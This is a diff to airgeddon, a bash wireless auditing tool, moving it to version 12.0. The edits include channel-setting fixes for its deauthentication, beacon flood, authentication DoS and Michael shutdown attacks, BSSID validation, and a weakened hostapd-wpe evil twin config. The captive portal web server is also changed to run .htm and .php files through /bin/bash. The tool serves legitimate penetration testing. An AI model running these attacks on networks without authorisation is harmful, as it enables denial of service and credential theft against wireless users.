@@ -125,8 +125,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="11.51"
-language_strings_expected_version="11.51-1"
+airgeddon_version="12.0"
+language_strings_expected_version="12.0-1"
 standardhandshake_filename="handshake-01.cap"
 standardpmkid_filename="pmkid_hash.txt"
 standardpmkidcap_filename="pmkid.cap"
@@ -1557,9 +1557,9 @@ function prepare_et_monitor() {
 	iface_phy_number=${phy_interface:3:1}
 	iface_monitor_et_deauth="mon${iface_phy_number}"
 
+	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 	iw phy "${phy_interface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
 	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
-	iw "${iface_monitor_et_deauth}" set channel "${channel}" > /dev/null 2>&1
 }
 
 #Assure the mode of the interface before the Evil Twin or Enterprise process
@@ -3017,8 +3017,19 @@ function ask_bssid() {
 			fi
 		fi
 
-		while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
-			read_bssid "wps"
+		while true; do
+			while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
+				read_bssid "wps"
+			done
+			local first_byte_hex="${wps_bssid%%:*}"
+			local first_byte=$((16#$first_byte_hex))
+			if (( first_byte & 1 )); then
+				echo
+				language_strings "${language}" 773 "red"
+				read_bssid "wps"
+				continue
+			fi
+			break
 		done
 		echo
 		language_strings "${language}" 364 "blue"
@@ -3039,8 +3050,19 @@ function ask_bssid() {
 			fi
 		fi
 
-		while [[ ! ${bssid} =~ ${regexp} ]]; do
-			read_bssid
+		while true; do
+			while [[ ! ${bssid} =~ ${regexp} ]]; do
+				read_bssid
+			done
+			local first_byte_hex="${bssid%%:*}"
+			local first_byte=$((16#$first_byte_hex))
+			if (( first_byte & 1 )); then
+				echo
+				language_strings "${language}" 773 "red"
+				read_bssid
+				continue
+			fi
+			break
 		done
 		echo
 		language_strings "${language}" 28 "blue"
@@ -4609,6 +4631,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
@@ -4621,6 +4644,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=3
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
@@ -4632,6 +4656,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
@@ -4643,6 +4668,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n '${essid}' -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
@@ -4654,6 +4680,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e '${essid}' -c ${channel}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
@@ -4665,6 +4692,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
@@ -4676,6 +4704,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
@@ -4686,7 +4715,7 @@ function launch_dos_pursuit_mode_attack() {
 		"Aireplay")
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
-			iw "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			dos_delay=3
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -4699,6 +4728,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
@@ -4836,6 +4866,7 @@ function exec_mdkdeauth() {
 		launch_dos_pursuit_mode_attack "${mdk_command} amok attack" "first_time"
 		pid_control_pursuit_mode "${mdk_command} amok attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -4864,8 +4895,7 @@ function exec_aireplaydeauth() {
 		launch_dos_pursuit_mode_attack "aireplay deauth attack" "first_time"
 		pid_control_pursuit_mode "aireplay deauth attack"
 	else
-		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
-
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -4894,6 +4924,7 @@ function exec_wdsconfusion() {
 		launch_dos_pursuit_mode_attack "wids / wips / wds confusion attack" "first_time"
 		pid_control_pursuit_mode "wids / wips / wds confusion attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -4922,6 +4953,7 @@ function exec_beaconflood() {
 		launch_dos_pursuit_mode_attack "beacon flood attack" "first_time"
 		pid_control_pursuit_mode "beacon flood attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -4950,6 +4982,7 @@ function exec_authdos() {
 		launch_dos_pursuit_mode_attack "auth dos attack" "first_time"
 		pid_control_pursuit_mode "auth dos attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -4978,6 +5011,7 @@ function exec_michaelshutdown() {
 		launch_dos_pursuit_mode_attack "michael shutdown attack" "first_time"
 		pid_control_pursuit_mode "michael shutdown attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -6198,6 +6232,16 @@ function clean_tmpfiles() {
 
 	if [ "${1}" = "exit_script" ]; then
 		rm -rf "${tmpdir}" > /dev/null 2>&1
+		rm -rf "${scriptfolder}${hostapd_wpe_default_log}" > /dev/null 2>&1
+
+		if [ "${dhcpd_path_changed}" -eq 1 ]; then
+			rm -rf "${dhcp_path}" > /dev/null 2>&1
+		fi
+
+		if [ "${beef_found}" -eq 1 ]; then
+			rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
+		fi
+
 		if is_last_airgeddon_instance; then
 			delete_instance_orchestrator_file
 		fi
@@ -10338,9 +10382,11 @@ function set_hostapd_wpe_config() {
 	echo -e "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f"
 	echo -e "wpa=2"
 	echo -e "wpa_key_mgmt=WPA-EAP"
-	echo -e "wpa_pairwise=CCMP"
-	echo -e "rsn_pairwise=CCMP"
+	echo -e "wpa_pairwise=TKIP CCMP"
+	echo -e "rsn_pairwise=TKIP CCMP"
 	echo -e "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user"
+	echo -e "ieee80211w=0"
+	echo -e "auth_algs=3"
 	} >> "${tmpdir}${hostapd_wpe_file}"
 
 	{
@@ -11838,9 +11884,14 @@ function set_webserver_config() {
 	echo -e "server.error-handler-404 = \"/\"\n"
 	echo -e "mimetype.assign = ("
 	echo -e "\".css\" => \"text/css\","
+	echo -e "\".htm\" => \"text/html\","
+	echo -e "\".html\" => \"text/html\","
 	echo -e "\".js\" => \"text/javascript\""
 	echo -e ")\n"
-	echo -e "cgi.assign = (\".htm\" => \"/bin/bash\")\n"
+	echo -e "cgi.assign = ("
+	echo -e "\".htm\" => \"/bin/bash\","
+	echo -e "\".php\" => \"/bin/bash\""
+	echo -e ")\n"
 	echo -e "accesslog.filename = \"${tmpdir}${webserver_log}\""
 	echo -e "accesslog.escaping = \"default\""
 	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\""
@@ -11888,7 +11939,7 @@ function prepare_captive_portal_data() {
 										["Vantiva"]="F85E42"
 										["Xavi"]="000138 E09153"
 										["ZTE"]="000947 0015EB 0019C6 001E73 002293 002512 0026ED 004A77 041DC7 049573 08181A 083FBC 086083 0C1262 0C3747 0C72D9 10D0AB 143EBF 146080 146B9A 18132D 1844E6 18686A 1C2704 208986 20E882 24586E 247E51 24C44A 24D3F2 287B09 288CB8 28FF3E 2C26C5 2C957F 300C23 304240 309935 30D386 30F31D 343759 344B50 344DEA 346987 347839 34DAB7 34DE34 34E0CF 384608 386E88 38D82F 38E1AA 38E2DD 3CDA2A 3CF652 4413D0 44F436 44FB5A 44FFBA 48282F 4859A4 48A74E 4C09B4 4C16F1 4C494F 4CABFC 4CAC0A 4CCBF5 5078B3 50AF4D 540955 5422F8 54BE53 585FF6 5C3A3D 601466 601888 6073BC 64136C 681AB2 688AF0 689FF0 6C8B2F 6CA75F 6CD2BA 702E22 709F2D 744AA4 749781 74A78E 74B57E 781D4A 78312B 789682 78C1A7 78E8B6 7C3953 80B07B 84139F 841C70 84742A 847460 885DFB 88D274 8C14B4 8C68C8 8C7967 8CDC02 8CE081 8CE117 901D27 90869B 90C7D8 90D8F3 90FD73 949869 94A7B7 94BF80 94E3EE 98006A 981333 986CF5 98F428 98F537 9C2F4E 9C63ED 9C6F52 9CA9E4 9CD24B 9CE91C A091C8 A0EC80 A44027 A47E39 A4F33B A8A668 AC00D0 AC6462 B00AD5 B075D5 B0ACD2 B0B194 B0C19E B41C30 B49842 B4B362 B4DEDF B805AB BC1695 C09FE1 C0B101 C0FD84 C4741E C4A366 C85A9F C864C7 C87B5B C8EAF8 CC1AFA CC7B35 D0154A D058A8 D05BA8 D0608C D071C4 D437D7 D47226 D476EA D49E05 D4B709 D4C1C8 D855A3 D87495 D8A8C8 DC028E DC7137 DCDFD6 DCF8B9 E01954 E0383F E07C13 E0C3F3 E447B3 E47723 E47E9A E4BD4B E4CA12 E8A1F8 E8ACAD E8B541 EC1D7F EC237B EC6CB5 EC8263 EC8A4C ECF0FE F084C9 F41F88 F46DE2 F4B5AA F4B8A7 F4E4AD F80DF0 F8A34F F8DFA8 FC2D5E FC94CE FCC897"
-										["Zyxel"]="001349 0019CB 0023F8 00A0C5 04BF6D 082697 1071B3 107BEF 143375 14360E 1C740D 28285D 30BD13 404A03 48EDE6 4C9EFF 4CC53E 5067F0 50E039 54833A 588BF3 5C648E 5C6A80 5CE28C 5CF4AB 603197 64DD68 6C4F89 7049A2 78C57D 7C7716 80EA0B 88ACC0 8C5973 909F22 90EF68 980D67 A0E4CB B0B2DC B8D526 B8ECA3 BC7EC3 BC9911 BCCF4F C8544B C86C87 CC5D4E D41AD1 D43DF3 D8912A D8ECE5 E4186B E8377A EC3EB3 EC43F6 F08756 F44D5C F80DA9 FC22F4 FC9F2A FCF528"
+										["Zyxel"]="001349 0019CB 0023F8 00A0C5 04BF6D 082697 1071B3 107BEF 143375 14360E 1C740D 2037F0 28285D 30BD13 404A03 48EDE6 4C9EFF 4CC53E 5067F0 50E039 54833A 588BF3 5C648E 5C6A80 5CE28C 5CF4AB 603197 64DD68 6C4F89 7049A2 78C57D 7C7716 80EA0B 88ACC0 8C5973 909F22 90EF68 980D67 A0E4CB B0B2DC B8D526 B8ECA3 BC7EC3 BC9911 BCCF4F C8544B C86C87 CC5D4E D41AD1 D43DF3 D8912A D8ECE5 E4186B E8377A EC3EB3 EC43F6 F08756 F44D5C F80DA9 FC22F4 FC9F2A FCF528"
 									)
 
 		declare -gA cp_router_colors=(
@@ -13173,7 +13224,7 @@ function exec_decloak_by_dictionary() {
 
 	debug_print
 
-	iw "${interface}" set channel "${channel}" > /dev/null 2>&1
+	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 
 	local unbuffer
 	unbuffer=""
